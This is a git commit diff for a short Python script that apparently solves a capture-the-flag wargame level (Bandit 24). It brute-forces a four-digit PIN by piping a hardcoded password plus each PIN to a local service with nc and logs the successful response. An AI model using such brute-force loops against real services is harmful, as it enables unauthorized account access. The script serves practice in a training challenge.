d5c1e4e63b358c8de66de4312324ffc9fa374a55
Joseph Murphy <jmurphy5277@gmail.com>
2015-04-01 13:59:20 -0400

    Updated the bruteforce for bandit24

--- Bandit/bruteforce_bandit24.py
+++ Bandit/bruteforce_bandit24.py
@@ -1,6 +1,6 @@
 import os
 
 for i in range(10000):
-	password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i)
+	password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i).zfill(4)
 	print password
-	os.system("echo "+password+" | nc localhost 30002")	
+	os.system("echo "+password+" | nc localhost 30002 | grep bandit25\ is >> password.txt")
